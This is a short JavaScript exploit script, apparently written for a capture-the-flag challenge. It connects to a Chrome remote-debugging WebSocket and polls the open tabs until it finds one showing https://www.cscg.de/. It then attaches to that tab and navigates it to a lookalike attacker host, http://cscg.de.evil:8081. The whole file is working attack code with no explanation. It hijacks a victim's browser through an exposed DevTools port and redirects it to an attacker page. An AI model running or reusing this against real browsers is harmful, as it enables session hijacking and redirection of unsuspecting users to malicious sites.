const listeners = {};

const responses = {};
let response_id = 1;
let interval = 0;
function send_command(ws, command) {
  command.id = response_id;
  ws.send(JSON.stringify(command));
  response_id++;
  return new Promise((resolve,reject)=>{
    responses[(response_id-1) + '_response'] = function(messages){
      resolve(messages)
    };
  })
}
function navigatePage(ws,session_id) {
  console.log('session id', session_id);

  send_command(ws,{
      sessionId: session_id,
      method: 'Page.navigate',
      params: {
        url: "http://cscg.de.evil:8081"
      },
    }).then((message)=>{
        console.log('page',message)
    }).catch(error=>{
      console.log(error)
    })
}
function attachTarget(ws,target_id) {
  send_command(ws,{
      method: 'Target.attachToTarget',
      params: {
        targetId: target_id,
        flatten: true
      },
    }).then((message)=>{
        console.log('session',message)
        navigatePage(ws,message.sessionId)
    })
}

function discover(ws) {
  send_command(ws,{
    method: 'Target.getTargets',
  }).then((messages)=>{
    for(const m of messages.targetInfos){
      console.log(m.url);
      if(m.url == "https://www.cscg.de/" && m.title != 'about:blank'){
        clearInterval(interval);
        attachTarget(ws,m.targetId);
      }
    }
  })

}

let ws = new WebSocket('copied chrome debug server url')
ws.onopen = function() {
  interval = setInterval(() => {
    discover(ws);
  }, 400);
}

let list_messages = []
ws.onmessage = function(message) {
  const data = JSON.parse(message.data)
  console.log(data)
  if(data.hasOwnProperty('id')) {
    if(data.hasOwnProperty('error')){
      console.log(data.error.message)
      return
    }
    copy_list_messages = list_messages.map(e=>e); 
    list_messages = [];
    let func = responses[data.id + '_response'];
    func(data.result);
    delete responses[data.id + '_response'];
  }else{
    list_messages.push(data)
  }

}